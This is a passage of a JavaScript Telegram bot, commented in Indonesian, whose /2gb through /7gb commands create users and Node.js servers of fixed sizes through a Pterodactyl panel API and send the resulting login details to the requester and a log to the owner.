        }, { headers: { 'Authorization': `Bearer ${PTERO_API_KEY}`, 'Content-Type': 'application/json', 'Accept': 'application/json' } });

        // --- 3. DEFINISIKAN logMsg DAN successMsg DISINI ✅ ---
        const successMsg = `<blockquote><b>🚀 PANEL 1GB BERHASIL!</b>\n` +
            `━━━━━━━━━━━━━━━━━━━━\n` +
            `👤 <b>User:</b> <code>${username}</code>\n` +
            `🔑 <b>Pass:</b> <code>${password}</code>\n` +
            `📊 <b>Specs:</b> <b>1GB RAM / 1GB DISK</b>\n` +
            `━━━━━━━━━━━━━━━━━━━━\n\n` +
            `<b>Login:</b> ${PTERO_URL}</blockquote>`;

        const logMsg = `<blockquote><b>📢 LOG CREATE PANEL (1GB)</b>\n` +
            `━━━━━━━━━━━━━━━━━━━━\n` +
            `👤 <b>Dari:</b> ${ctx.from.first_name} (@${ctx.from.username || 'n/a'})\n` +
            `🆔 <b>ID:</b> <code>${ctx.from.id}</code>\n` +
            `📂 <b>User Panel:</b> <code>${username}</code>\n` +
            `━━━━━━━━━━━━━━━━━━━━</blockquote>`;

        // --- 4. PENGIRIMAN PESAN ---

        // A. Kirim detail lengkap ke PV User
        try {
            await ctx.telegram.sendMessage(ctx.from.id, successMsg, { parse_mode: 'HTML' });
            
            // B. Kirim notif ke GRUP (Tanpa password biar aman)
            await ctx.replyWithHTML(`<blockquote><b>✅ DONE!</b>\nPanel <b>${username}</b> sukses dibuat. Detail login sudah dikirim ke <b>Private Chat (PV)</b> lo!</blockquote>`, {
                message_effect_id: isPrivate ? "5159385139981059251" : undefined,
            });
        } catch (e) {
            // Jika gagal PV karena user belum /start bot
            await ctx.replyWithHTML(`<blockquote><b>⚠️ GAGAL PV!</b>\nPanel jadi, tapi detail gak bisa dikirim. <b>KLIK START</b> dulu di bot ini lalu hubungi owner.</blockquote>`);
        }

        // C. Kirim Log ke lo (Owner) ✅ (logMsg sudah ada isinya sekarang)
       await bot.telegram.sendMessage(OWNER_IDS[0], logMsg, { parse_mode: 'HTML' });

    } catch (err) {
        const errorDetail = err.response?.data?.errors?.[0]?.detail || err.message;
        ctx.replyWithHTML(`<blockquote><b>❌ GAGAL:</b>\n<code>${errorDetail}</code></blockquote>`);
    }
});

bot.command('2gb', checkPremium, async (ctx) => {
    const isPrivate = ctx.chat.type === 'private';
    const args = ctx.message.text.split(' ');
    if (args.length < 2) return ctx.replyWithHTML("<b>⚠️ Format:</b> <code>/2gb [nama]</code>");
    
    // Cek Akses (Owner atau Grup terdaftar)
    if (!hasAccess(ctx.from.id) && !hasAccess(ctx.chat.id)) {
        return ctx.replyWithHTML("<blockquote><b>❌ AKSES DITOLAK!</b>\nLo belum punya izin buat create panel. Hubungi @Raffioffci2</blockquote>");
    }

    const username = args[1].toLowerCase().replace(/[^a-z0-9]/g, '');
    const email = `${username}@NightShide.com`; 
    const password = Math.random().toString(36).slice(-10);

    try {
        await ctx.replyWithHTML(`⏳ <b>PROSES:</b> Sedang membuatkan panel 2GB untuk <b>${username}</b>...`);

        // 1. Create User
        const userRes = await axios.post(`${PTERO_URL}/api/application/users`, {
            email: email, 
            username: username, 
            first_name: username, 
            last_name: "VNX", 
            password: password
        }, { 
            headers: { 
                'Authorization': `Bearer ${PTERO_API_KEY}`, 
                'Accept': 'application/json' 
            } 
        });

        const userId = userRes.data.attributes.id;

        // 2. Create Server (Limit 2048MB = 2GB)
        const serverRes = await axios.post(`${PTERO_URL}/api/application/servers`, {
            name: `VNX-${username}`,
            user: userId,
            nest: NEST_ID,
            egg: EGG_ID,
            docker_image: "ghcr.io/parkervcp/yolks:nodejs_18",
            startup: "if [[ -d .git ]] && [[ {{AUTO_UPDATE}} == \"1\" ]]; then git pull; fi; if [[ ! -z ${NODE_PACKAGES} ]]; then /usr/local/bin/npm install ${NODE_PACKAGES}; fi; if [[ ! -z ${UNNODE_PACKAGES} ]]; then /usr/local/bin/npm uninstall ${UNNODE_PACKAGES}; fi; if [ -f /home/container/package.json ]; then /usr/local/bin/npm install; fi; /usr/local/bin/${CMD_RUN};",
            environment: { 
                "CMD_RUN": "npm start",
                "MAIN_FILE": "start.js",
                "USER_UPLOAD": "0",
                "AUTO_UPDATE": "0"
            },
            // LIMITS UBAH KE 2048 (2GB)
            limits: { 
                memory: 2048, // 2GB RAM
                swap: 0, 
                disk: 2048,   // 2GB DISK
                io: 500, 
                cpu: 100      
            },
            feature_limits: { databases: 5, backups: 5, allocations: 1 },
            deploy: { locations: [LOCATION_ID], dedicated_ip: false, port_range: [] }
        }, { 
            headers: { 
                'Authorization': `Bearer ${PTERO_API_KEY}`, 
                'Content-Type': 'application/json',
                'Accept': 'application/json' 
            } 
        });

        // --- 3. DEFINISIKAN logMsg DAN successMsg DISINI ✅ ---
        const successMsg = `<blockquote><b>🚀 PANEL 2GB BERHASIL!</b>\n` +
            `━━━━━━━━━━━━━━━━━━━━\n` +
            `👤 <b>User:</b> <code>${username}</code>\n` +
            `🔑 <b>Pass:</b> <code>${password}</code>\n` +
            `📊 <b>Specs:</b> <b>2GB RAM / 2GB DISK</b>\n` +
            `━━━━━━━━━━━━━━━━━━━━\n\n` +
            `<b>Login:</b> ${PTERO_URL}</blockquote>`;

        const logMsg = `<blockquote><b>📢 LOG CREATE PANEL (2GB)</b>\n` +
            `━━━━━━━━━━━━━━━━━━━━\n` +
            `👤 <b>Dari:</b> ${ctx.from.first_name} (@${ctx.from.username || 'n/a'})\n` +
            `🆔 <b>ID:</b> <code>${ctx.from.id}</code>\n` +
            `📂 <b>User Panel:</b> <code>${username}</code>\n` +
            `━━━━━━━━━━━━━━━━━━━━</blockquote>`;

        // --- 4. PENGIRIMAN PESAN ---

        // A. Kirim detail lengkap ke PV User
        try {
            await ctx.telegram.sendMessage(ctx.from.id, successMsg, { parse_mode: 'HTML' });
            
            // B. Kirim notif ke GRUP (Tanpa password biar aman)
            await ctx.replyWithHTML(`<blockquote><b>✅ DONE!</b>\nPanel <b>${username}</b> sukses dibuat. Detail login sudah dikirim ke <b>Private Chat (PV)</b> lo!</blockquote>`, {
                message_effect_id: isPrivate ? "5159385139981059251" : undefined,
            });
        } catch (e) {
            // Jika gagal PV karena user belum /start bot
            await ctx.replyWithHTML(`<blockquote><b>⚠️ GAGAL PV!</b>\nPanel jadi, tapi detail gak bisa dikirim. <b>KLIK START</b> dulu di bot ini lalu hubungi owner.</blockquote>`);
        }

        // C. Kirim Log ke lo (Owner) ✅ (logMsg sudah ada isinya sekarang)
        await bot.telegram.sendMessage(OWNER_IDS[0], logMsg, { parse_mode: 'HTML' });

    } catch (err) {
        const errorDetail = err.response?.data?.errors?.[0]?.detail || err.message;
        ctx.replyWithHTML(`<blockquote><b>❌ GAGAL:</b>\n<code>${errorDetail}</code></blockquote>`);
    }
});

bot.command('3gb', checkPremium, async (ctx) => {
    const isPrivate = ctx.chat.type === 'private';
    const args = ctx.message.text.split(' ');
    if (args.length < 2) return ctx.replyWithHTML("<b>⚠️ Format:</b> <code>/3gb [nama]</code>");
    
    // Cek Akses (Owner atau Grup terdaftar)
    if (!hasAccess(ctx.from.id) && !hasAccess(ctx.chat.id)) {
        return ctx.replyWithHTML("<blockquote><b>❌ AKSES DITOLAK!</b>\nLo belum punya izin buat create panel. Hubungi @Raffioffci2</blockquote>");
    }
    
    const username = args[1].toLowerCase().replace(/[^a-z0-9]/g, '');
    const email = `${username}@vnx.com`; 
    const password = Math.random().toString(36).slice(-10);

    try {
        await ctx.replyWithHTML(`⏳ <b>PROSES:</b> Sedang membuatkan panel 3GB untuk <b>${username}</b>...`);

        // 1. Create User
        const userRes = await axios.post(`${PTERO_URL}/api/application/users`, {
            email: email, 
            username: username, 
            first_name: username, 
            last_name: "VNX", 
            password: password
        }, { 
            headers: { 
                'Authorization': `Bearer ${PTERO_API_KEY}`, 
                'Accept': 'application/json' 
            } 
        });

        const userId = userRes.data.attributes.id;

        // 2. Create Server (Limit 3072MB = 3GB)
        const serverRes = await axios.post(`${PTERO_URL}/api/application/servers`, {
            name: `VNX-${username}`,
            user: userId,
            nest: NEST_ID,
            egg: EGG_ID,
            docker_image: "ghcr.io/parkervcp/yolks:nodejs_18",
            startup: "if [[ -d .git ]] && [[ {{AUTO_UPDATE}} == \"1\" ]]; then git pull; fi; if [[ ! -z ${NODE_PACKAGES} ]]; then /usr/local/bin/npm install ${NODE_PACKAGES}; fi; if [[ ! -z ${UNNODE_PACKAGES} ]]; then /usr/local/bin/npm uninstall ${UNNODE_PACKAGES}; fi; if [ -f /home/container/package.json ]; then /usr/local/bin/npm install; fi; /usr/local/bin/${CMD_RUN};",
            environment: { 
                "CMD_RUN": "npm start",
                "MAIN_FILE": "start.js",
                "USER_UPLOAD": "0",
                "AUTO_UPDATE": "0"
            },
            // LIMITS UBAH KE 3072 (3GB)
            limits: { 
                memory: 3072, // 3GB RAM
                swap: 0, 
                disk: 3072,   // 3GB DISK
                io: 500, 
                cpu: 100      
            },
            feature_limits: { databases: 5, backups: 5, allocations: 1 },
            deploy: { locations: [LOCATION_ID], dedicated_ip: false, port_range: [] }
        }, { 
            headers: { 
                'Authorization': `Bearer ${PTERO_API_KEY}`, 
                'Content-Type': 'application/json',
                'Accept': 'application/json' 
            } 
        });

        // --- 3. DEFINISIKAN logMsg DAN successMsg DISINI ✅ ---
        const successMsg = `<blockquote><b>🚀 PANEL 3GB BERHASIL!</b>\n` +
            `━━━━━━━━━━━━━━━━━━━━\n` +
            `👤 <b>User:</b> <code>${username}</code>\n` +
            `🔑 <b>Pass:</b> <code>${password}</code>\n` +
            `📊 <b>Specs:</b> <b>3GB RAM / 3GB DISK</b>\n` +
            `━━━━━━━━━━━━━━━━━━━━\n\n` +
            `<b>Login:</b> ${PTERO_URL}</blockquote>`;

        const logMsg = `<blockquote><b>📢 LOG CREATE PANEL (3GB)</b>\n` +
            `━━━━━━━━━━━━━━━━━━━━\n` +
            `👤 <b>Dari:</b> ${ctx.from.first_name} (@${ctx.from.username || 'n/a'})\n` +
            `🆔 <b>ID:</b> <code>${ctx.from.id}</code>\n` +
            `📂 <b>User Panel:</b> <code>${username}</code>\n` +
            `━━━━━━━━━━━━━━━━━━━━</blockquote>`;

        // --- 4. PENGIRIMAN PESAN ---

        // A. Kirim detail lengkap ke PV User
        try {
            await ctx.telegram.sendMessage(ctx.from.id, successMsg, { parse_mode: 'HTML' });
            
            // B. Kirim notif ke GRUP (Tanpa password biar aman)
            await ctx.replyWithHTML(`<blockquote><b>✅ DONE!</b>\nPanel <b>${username}</b> sukses dibuat. Detail login sudah dikirim ke <b>Private Chat (PV)</b> lo!</blockquote>`, {
                message_effect_id: isPrivate ? "5159385139981059251" : undefined,
            });
        } catch (e) {
            // Jika gagal PV karena user belum /start bot
            await ctx.replyWithHTML(`<blockquote><b>⚠️ GAGAL PV!</b>\nPanel jadi, tapi detail gak bisa dikirim. <b>KLIK START</b> dulu di bot ini lalu hubungi owner.</blockquote>`);
        }

        // C. Kirim Log ke lo (Owner) ✅ (logMsg sudah ada isinya sekarang)
        await bot.telegram.sendMessage(OWNER_IDS[0], logMsg, { parse_mode: 'HTML' });

    } catch (err) {
        const errorDetail = err.response?.data?.errors?.[0]?.detail || err.message;
        ctx.replyWithHTML(`<blockquote><b>❌ GAGAL:</b>\n<code>${errorDetail}</code></blockquote>`);
    }
});

bot.command('4gb', checkPremium, async (ctx) => {
    const isPrivate = ctx.chat.type === 'private';
    const args = ctx.message.text.split(' ');
    if (args.length < 2) return ctx.replyWithHTML("<b>⚠️ Format:</b> <code>/4gb [nama]</code>");
    
    // Cek Akses (Owner atau Grup terdaftar)
    if (!hasAccess(ctx.from.id) && !hasAccess(ctx.chat.id)) {
        return ctx.replyWithHTML("<blockquote><b>❌ AKSES DITOLAK!</b>\nLo belum punya izin buat create panel. Hubungi @Raffioffci2</blockquote>");
    }

    const username = args[1].toLowerCase().replace(/[^a-z0-9]/g, '');
    const email = `${username}@vnx.com`; 
    const password = Math.random().toString(36).slice(-10);

    try {
        await ctx.replyWithHTML(`⏳ <b>PROSES:</b> Sedang membuatkan panel 4GB untuk <b>${username}</b>...`);

        // 1. Create User
        const userRes = await axios.post(`${PTERO_URL}/api/application/users`, {
            email: email, 
            username: username, 
            first_name: username, 
            last_name: "VNX", 
            password: password
        }, { 
            headers: { 
                'Authorization': `Bearer ${PTERO_API_KEY}`, 
                'Accept': 'application/json' 
            } 
        });

        const userId = userRes.data.attributes.id;

        // 2. Create Server (Limit 4096MB = 4GB)
        const serverRes = await axios.post(`${PTERO_URL}/api/application/servers`, {
            name: `VNX-${username}`,
            user: userId,
            nest: NEST_ID,
            egg: EGG_ID,
            docker_image: "ghcr.io/parkervcp/yolks:nodejs_18",
            startup: "if [[ -d .git ]] && [[ {{AUTO_UPDATE}} == \"1\" ]]; then git pull; fi; if [[ ! -z ${NODE_PACKAGES} ]]; then /usr/local/bin/npm install ${NODE_PACKAGES}; fi; if [[ ! -z ${UNNODE_PACKAGES} ]]; then /usr/local/bin/npm uninstall ${UNNODE_PACKAGES}; fi; if [ -f /home/container/package.json ]; then /usr/local/bin/npm install; fi; /usr/local/bin/${CMD_RUN};",
            environment: { 
                "CMD_RUN": "npm start",
                "MAIN_FILE": "start.js",
                "USER_UPLOAD": "0",
                "AUTO_UPDATE": "0"
            },
            // LIMITS UBAH KE 4096 (4GB)
            limits: { 
                memory: 4096, // 4GB RAM
                swap: 0, 
                disk: 4096,   // 4GB DISK
                io: 500, 
                cpu: 100      
            },
            feature_limits: { databases: 5, backups: 5, allocations: 1 },
            deploy: { locations: [LOCATION_ID], dedicated_ip: false, port_range: [] }
        }, { 
            headers: { 
                'Authorization': `Bearer ${PTERO_API_KEY}`, 
                'Content-Type': 'application/json',
                'Accept': 'application/json' 
            } 
        });

        // --- 3. DEFINISIKAN logMsg DAN successMsg DISINI ✅ ---
        const successMsg = `<blockquote><b>🚀 PANEL 4GB BERHASIL!</b>\n` +
            `━━━━━━━━━━━━━━━━━━━━\n` +
            `👤 <b>User:</b> <code>${username}</code>\n` +
            `🔑 <b>Pass:</b> <code>${password}</code>\n` +
            `📊 <b>Specs:</b> <b>4GB RAM / 4GB DISK</b>\n` +
            `━━━━━━━━━━━━━━━━━━━━\n\n` +
            `<b>Login:</b> ${PTERO_URL}</blockquote>`;

        const logMsg = `<blockquote><b>📢 LOG CREATE PANEL (4GB)</b>\n` +
            `━━━━━━━━━━━━━━━━━━━━\n` +
            `👤 <b>Dari:</b> ${ctx.from.first_name} (@${ctx.from.username || 'n/a'})\n` +
            `🆔 <b>ID:</b> <code>${ctx.from.id}</code>\n` +
            `📂 <b>User Panel:</b> <code>${username}</code>\n` +
            `━━━━━━━━━━━━━━━━━━━━</blockquote>`;

        // --- 4. PENGIRIMAN PESAN ---

        // A. Kirim detail lengkap ke PV User
        try {
            await ctx.telegram.sendMessage(ctx.from.id, successMsg, { parse_mode: 'HTML' });
            
            // B. Kirim notif ke GRUP (Tanpa password biar aman)
            await ctx.replyWithHTML(`<blockquote><b>✅ DONE!</b>\nPanel <b>${username}</b> sukses dibuat. Detail login sudah dikirim ke <b>Private Chat (PV)</b> lo!</blockquote>`, {
                message_effect_id: isPrivate ? "5159385139981059251" : undefined,
            });
        } catch (e) {
            // Jika gagal PV karena user belum /start bot
            await ctx.replyWithHTML(`<blockquote><b>⚠️ GAGAL PV!</b>\nPanel jadi, tapi detail gak bisa dikirim. <b>KLIK START</b> dulu di bot ini lalu hubungi owner.</blockquote>`);
        }

        // C. Kirim Log ke lo (Owner) ✅ (logMsg sudah ada isinya sekarang)
        await bot.telegram.sendMessage(OWNER_IDS[0], logMsg, { parse_mode: 'HTML' });

    } catch (err) {
        const errorDetail = err.response?.data?.errors?.[0]?.detail || err.message;
        ctx.replyWithHTML(`<blockquote><b>❌ GAGAL:</b>\n<code>${errorDetail}</code></blockquote>`);
    }
});

bot.command('5gb', checkPremium, async (ctx) => {
    const isPrivate = ctx.chat.type === 'private';
    const args = ctx.message.text.split(' ');
    if (args.length < 2) return ctx.replyWithHTML("<b>⚠️ Format:</b> <code>/5gb [nama]</code>");
    
    // Cek Akses (Owner atau Grup terdaftar)
    if (!hasAccess(ctx.from.id) && !hasAccess(ctx.chat.id)) {
        return ctx.replyWithHTML("<blockquote><b>❌ AKSES DITOLAK!</b>\nLo belum punya izin buat create panel. Hubungi @Raffioffci2</blockquote>");
    }

    const username = args[1].toLowerCase().replace(/[^a-z0-9]/g, '');
    const email = `${username}@vnx.com`; 
    const password = Math.random().toString(36).slice(-10);

    try {
        await ctx.replyWithHTML(`⏳ <b>PROSES:</b> Sedang membuatkan panel 5GB untuk <b>${username}</b>...`);

        // 1. Create User
        const userRes = await axios.post(`${PTERO_URL}/api/application/users`, {
            email: email, 
            username: username, 
            first_name: username, 
            last_name: "VNX", 
            password: password
        }, { 
            headers: { 
                'Authorization': `Bearer ${PTERO_API_KEY}`, 
                'Accept': 'application/json' 
            } 
        });

        const userId = userRes.data.attributes.id;

        // 2. Create Server (Limit 5120MB = 5GB)
        const serverRes = await axios.post(`${PTERO_URL}/api/application/servers`, {
            name: `VNX-${username}`,
            user: userId,
            nest: NEST_ID,
            egg: EGG_ID,
            docker_image: "ghcr.io/parkervcp/yolks:nodejs_18",
            startup: "if [[ -d .git ]] && [[ {{AUTO_UPDATE}} == \"1\" ]]; then git pull; fi; if [[ ! -z ${NODE_PACKAGES} ]]; then /usr/local/bin/npm install ${NODE_PACKAGES}; fi; if [[ ! -z ${UNNODE_PACKAGES} ]]; then /usr/local/bin/npm uninstall ${UNNODE_PACKAGES}; fi; if [ -f /home/container/package.json ]; then /usr/local/bin/npm install; fi; /usr/local/bin/${CMD_RUN};",
            environment: { 
                "CMD_RUN": "npm start",
                "MAIN_FILE": "start.js",
                "USER_UPLOAD": "0",
                "AUTO_UPDATE": "0"
            },
            // LIMITS UBAH KE 5120 (5GB)
            limits: { 
                memory: 5120, // 5GB RAM
                swap: 0, 
                disk: 5120,   // 5GB DISK
                io: 500, 
                cpu: 100      
            },
            feature_limits: { databases: 5, backups: 5, allocations: 1 },
            deploy: { locations: [LOCATION_ID], dedicated_ip: false, port_range: [] }
        }, { 
            headers: { 
                'Authorization': `Bearer ${PTERO_API_KEY}`, 
                'Content-Type': 'application/json',
                'Accept': 'application/json' 
            } 
        });

        // --- 3. DEFINISIKAN logMsg DAN successMsg DISINI ✅ ---
        const successMsg = `<blockquote><b>🚀 PANEL 5GB BERHASIL!</b>\n` +
            `━━━━━━━━━━━━━━━━━━━━\n` +
            `👤 <b>User:</b> <code>${username}</code>\n` +
            `🔑 <b>Pass:</b> <code>${password}</code>\n` +
            `📊 <b>Specs:</b> <b>5GB RAM / 5GB DISK</b>\n` +
            `━━━━━━━━━━━━━━━━━━━━\n\n` +
            `<b>Login:</b> ${PTERO_URL}</blockquote>`;

        const logMsg = `<blockquote><b>📢 LOG CREATE PANEL (5GB)</b>\n` +
            `━━━━━━━━━━━━━━━━━━━━\n` +
            `👤 <b>Dari:</b> ${ctx.from.first_name} (@${ctx.from.username || 'n/a'})\n` +
            `🆔 <b>ID:</b> <code>${ctx.from.id}</code>\n` +
            `📂 <b>User Panel:</b> <code>${username}</code>\n` +
            `━━━━━━━━━━━━━━━━━━━━</blockquote>`;

        // --- 4. PENGIRIMAN PESAN ---

        // A. Kirim detail lengkap ke PV User
        try {
            await ctx.telegram.sendMessage(ctx.from.id, successMsg, { parse_mode: 'HTML' });
            
            // B. Kirim notif ke GRUP (Tanpa password biar aman)
            await ctx.replyWithHTML(`<blockquote><b>✅ DONE!</b>\nPanel <b>${username}</b> sukses dibuat. Detail login sudah dikirim ke <b>Private Chat (PV)</b> lo!</blockquote>`, {
                message_effect_id: isPrivate ? "5159385139981059251" : undefined,
            });
        } catch (e) {
            // Jika gagal PV karena user belum /start bot
            await ctx.replyWithHTML(`<blockquote><b>⚠️ GAGAL PV!</b>\nPanel jadi, tapi detail gak bisa dikirim. <b>KLIK START</b> dulu di bot ini lalu hubungi owner.</blockquote>`);
        }

        // C. Kirim Log ke lo (Owner) ✅ (logMsg sudah ada isinya sekarang)
        await bot.telegram.sendMessage(OWNER_IDS[0], logMsg, { parse_mode: 'HTML' });

    } catch (err) {
        const errorDetail = err.response?.data?.errors?.[0]?.detail || err.message;
        ctx.replyWithHTML(`<blockquote><b>❌ GAGAL:</b>\n<code>${errorDetail}</code></blockquote>`);
    }
});

bot.command('6gb', checkPremium, async (ctx) => {
    const isPrivate = ctx.chat.type === 'private';
    const args = ctx.message.text.split(' ');
    if (args.length < 2) return ctx.replyWithHTML("<b>⚠️ Format:</b> <code>/6gb [nama]</code>");
    
    // Cek Akses (Owner atau Grup terdaftar)
    if (!hasAccess(ctx.from.id) && !hasAccess(ctx.chat.id)) {
        return ctx.replyWithHTML("<blockquote><b>❌ AKSES DITOLAK!</b>\nLo belum punya izin buat create panel. Hubungi @Raffioffci2</blockquote>");
    }
    
    const username = args[1].toLowerCase().replace(/[^a-z0-9]/g, '');
    const email = `${username}@vnx.com`; 
    const password = Math.random().toString(36).slice(-10);

    try {
        await ctx.replyWithHTML(`⏳ <b>PROSES:</b> Sedang membuatkan panel 6GB untuk <b>${username}</b>...`);

        // 1. Create User
        const userRes = await axios.post(`${PTERO_URL}/api/application/users`, {
            email: email, 
            username: username, 
            first_name: username, 
            last_name: "VNX", 
            password: password
        }, { 
            headers: { 
                'Authorization': `Bearer ${PTERO_API_KEY}`, 
                'Accept': 'application/json' 
            } 
        });

        const userId = userRes.data.attributes.id;

        // 2. Create Server (Limit 6144MB = 6GB)
        const serverRes = await axios.post(`${PTERO_URL}/api/application/servers`, {
            name: `VNX-${username}`,
            user: userId,
            nest: NEST_ID,
            egg: EGG_ID,
            docker_image: "ghcr.io/parkervcp/yolks:nodejs_18",
            startup: "if [[ -d .git ]] && [[ {{AUTO_UPDATE}} == \"1\" ]]; then git pull; fi; if [[ ! -z ${NODE_PACKAGES} ]]; then /usr/local/bin/npm install ${NODE_PACKAGES}; fi; if [[ ! -z ${UNNODE_PACKAGES} ]]; then /usr/local/bin/npm uninstall ${UNNODE_PACKAGES}; fi; if [ -f /home/container/package.json ]; then /usr/local/bin/npm install; fi; /usr/local/bin/${CMD_RUN};",
            environment: { 
                "CMD_RUN": "npm start",
                "MAIN_FILE": "start.js",
                "USER_UPLOAD": "0",
                "AUTO_UPDATE": "0"
            },
            // LIMITS UBAH KE 6144 (6GB)
            limits: { 
                memory: 6144, // 6GB RAM
                swap: 0, 
                disk: 6144,   // 6GB DISK
                io: 500, 
                cpu: 100      
            },
            feature_limits: { databases: 5, backups: 5, allocations: 1 },
            deploy: { locations: [LOCATION_ID], dedicated_ip: false, port_range: [] }
        }, { 
            headers: { 
                'Authorization': `Bearer ${PTERO_API_KEY}`, 
                'Content-Type': 'application/json',
                'Accept': 'application/json' 
            } 
        });

        // --- 3. DEFINISIKAN logMsg DAN successMsg DISINI ✅ ---
        const successMsg = `<blockquote><b>🚀 PANEL 6GB BERHASIL!</b>\n` +
            `━━━━━━━━━━━━━━━━━━━━\n` +
            `👤 <b>User:</b> <code>${username}</code>\n` +
            `🔑 <b>Pass:</b> <code>${password}</code>\n` +
            `📊 <b>Specs:</b> <b>6GB RAM / 6GB DISK</b>\n` +
            `━━━━━━━━━━━━━━━━━━━━\n\n` +
            `<b>Login:</b> ${PTERO_URL}</blockquote>`;

        const logMsg = `<blockquote><b>📢 LOG CREATE PANEL (6GB)</b>\n` +
            `━━━━━━━━━━━━━━━━━━━━\n` +
            `👤 <b>Dari:</b> ${ctx.from.first_name} (@${ctx.from.username || 'n/a'})\n` +
            `🆔 <b>ID:</b> <code>${ctx.from.id}</code>\n` +
            `📂 <b>User Panel:</b> <code>${username}</code>\n` +
            `━━━━━━━━━━━━━━━━━━━━</blockquote>`;

        // --- 4. PENGIRIMAN PESAN ---

        // A. Kirim detail lengkap ke PV User
        try {
            await ctx.telegram.sendMessage(ctx.from.id, successMsg, { parse_mode: 'HTML' });
            
            // B. Kirim notif ke GRUP (Tanpa password biar aman)
            await ctx.replyWithHTML(`<blockquote><b>✅ DONE!</b>\nPanel <b>${username}</b> sukses dibuat. Detail login sudah dikirim ke <b>Private Chat (PV)</b> lo!</blockquote>`, {
                message_effect_id: isPrivate ? "5159385139981059251" : undefined,
            });
        } catch (e) {
            // Jika gagal PV karena user belum /start bot
            await ctx.replyWithHTML(`<blockquote><b>⚠️ GAGAL PV!</b>\nPanel jadi, tapi detail gak bisa dikirim. <b>KLIK START</b> dulu di bot ini lalu hubungi owner.</blockquote>`);
        }

        // C. Kirim Log ke lo (Owner) ✅ (logMsg sudah ada isinya sekarang)
        await bot.telegram.sendMessage(OWNER_IDS[0], logMsg, { parse_mode: 'HTML' });

    } catch (err) {
        const errorDetail = err.response?.data?.errors?.[0]?.detail || err.message;
        ctx.replyWithHTML(`<blockquote><b>❌ GAGAL:</b>\n<code>${errorDetail}</code></blockquote>`);
    }
});

bot.command('7gb', checkPremium, async (ctx) => {
    const isPrivate = ctx.chat.type === 'private';
    const args = ctx.message.text.split(' ');
    if (args.length < 2) return ctx.replyWithHTML("<b>⚠️ Format:</b> <code>/7gb [nama]</code>");
    
    // Cek Akses (Owner atau Grup terdaftar)
    if (!hasAccess(ctx.from.id) && !hasAccess(ctx.chat.id)) {
        return ctx.replyWithHTML("<blockquote><b>❌ AKSES DITOLAK!</b>\nLo belum punya izin buat create panel. Hubungi @Raffioffci2</blockquote>");
    }

    const username = args[1].toLowerCase().replace(/[^a-z0-9]/g, '');
    const email = `${username}@vnx.com`; 
    const password = Math.random().toString(36).slice(-10);

    try {
        await ctx.replyWithHTML(`⏳ <b>PROSES:</b> Sedang membuatkan panel 7GB untuk <b>${username}</b>...`);

        // 1. Create User
        const userRes = await axios.post(`${PTERO_URL}/api/application/users`, {
            email: email, 
            username: username, 
            first_name: username, 
            last_name: "VNX", 
            password: password
        }, { 
            headers: { 
                'Authorization': `Bearer ${PTERO_API_KEY}`, 
                'Accept': 'application/json' 
            } 
        });

        const userId = userRes.data.attributes.id;

        // 2. Create Server (Limit 7168MB = 7GB)
        const serverRes = await axios.post(`${PTERO_URL}/api/application/servers`, {
            name: `VNX-${username}`,
            user: userId,
            nest: NEST_ID,
            egg: EGG_ID,
            docker_image: "ghcr.io/parkervcp/yolks:nodejs_18",
            startup: "if [[ -d .git ]] && [[ {{AUTO_UPDATE}} == \"1\" ]]; then git pull; fi; if [[ ! -z ${NODE_PACKAGES} ]]; then /usr/local/bin/npm install ${NODE_PACKAGES}; fi; if [[ ! -z ${UNNODE_PACKAGES} ]]; then /usr/local/bin/npm uninstall ${UNNODE_PACKAGES}; fi; if [ -f /home/container/package.json ]; then /usr/local/bin/npm install; fi; /usr/local/bin/${CMD_RUN};",
            environment: { 
                "CMD_RUN": "npm start",
                "MAIN_FILE": "start.js",
                "USER_UPLOAD": "0",
                "AUTO_UPDATE": "0"
            },
            // LIMITS UBAH KE 7168 (7GB)
            limits: { 
                memory: 7168, // 7GB RAM
                swap: 0, 
                disk: 7168,   // 7GB DISK
                io: 500, 
                cpu: 100      
            },
            feature_limits: { databases: 5, backups: 5, allocations: 1 },
            deploy: { locations: [LOCATION_ID], dedicated_ip: false, port_range: [] }
        }, { 
            headers: { 
                'Authorization': `Bearer ${PTERO_API_KEY}`, 
                'Content-Type': 'application/json',
                'Accept': 'application/json' 
            } 
        });

       // --- 3. DEFINISIKAN logMsg DAN successMsg DISINI ✅ ---
        const successMsg = `<blockquote><b>🚀 PANEL 7GB BERHASIL!</b>\n` +
            `━━━━━━━━━━━━━━━━━━━━\n` +
            `👤 <b>User:</b> <code>${username}</code>\n` +
            `🔑 <b>Pass:</b> <code>${password}</code>\n` +
            `📊 <b>Specs:</b> <b>7GB RAM / 7GB DISK</b>\n` +
            `━━━━━━━━━━━━━━━━━━━━\n\n` +
            `<b>Login:</b> ${PTERO_URL}</blockquote>`;

        const logMsg = `<blockquote><b>📢 LOG CREATE PANEL (7GB)</b>\n` +
            `━━━━━━━━━━━━━━━━━━━━\n` +
            `👤 <b>Dari:</b> ${ctx.from.first_name} (@${ctx.from.username || 'n/a'})\n` +
            `🆔 <b>ID:</b> <code>${ctx.from.id}</code>\n` +
            `📂 <b>User Panel:</b> <code>${username}</code>\n` +
            `━━━━━━━━━━━━━━━━━━━━</blockquote>`;

        // --- 4. PENGIRIMAN PESAN ---

        // A. Kirim detail lengkap ke PV User
        try {
            await ctx.telegram.sendMessage(ctx.from.id, successMsg, { parse_mode: 'HTML' });
            
            // B. Kirim notif ke GRUP (Tanpa password biar aman)
            await ctx.replyWithHTML(`<blockquote><b>✅ DONE!</b>\nPanel <b>${username}</b> sukses dibuat. Detail login sudah dikirim ke <b>Private Chat (PV)</b> lo!</blockquote>`, {
                message_effect_id: isPrivate ? "5159385139981059251" : undefined,
            });
        } catch (e) {
            // Jika gagal PV karena user belum /start bot
            await ctx.replyWithHTML(`<blockquote><b>⚠️ GAGAL PV!</b>\nPanel jadi, tapi detail gak bisa dikirim. <b>KLIK START</b> dulu di bot ini lalu hubungi owner.</blockquote>`);
        }

        // C. Kirim Log ke lo (Owner) ✅ (logMsg sudah ada isinya sekarang)
        await bot.telegram.sendMessage(OWNER_IDS[0], logMsg, { parse_mode: 'HTML' });

    } catch (err) {
        const errorDetail = err.response?.data?.errors?.[0]?.detail || err.message;
        ctx.replyWithHTML(`<blockquote><b>❌ GAGAL:</b>\n<code>${errorDetail}</code></blockquote>`);
    }
});

bot.command('unli', checkPremium, async (ctx) => {
    const isPrivate = ctx.chat.type === 'private';
    const args = ctx.message.text.split(' ');
    if (args.length < 2) return ctx.replyWithHTML("<b>⚠️ Format:</b> <code>/unli [nama]</code>");
    
    // Cek Akses (Owner atau Grup terdaftar)
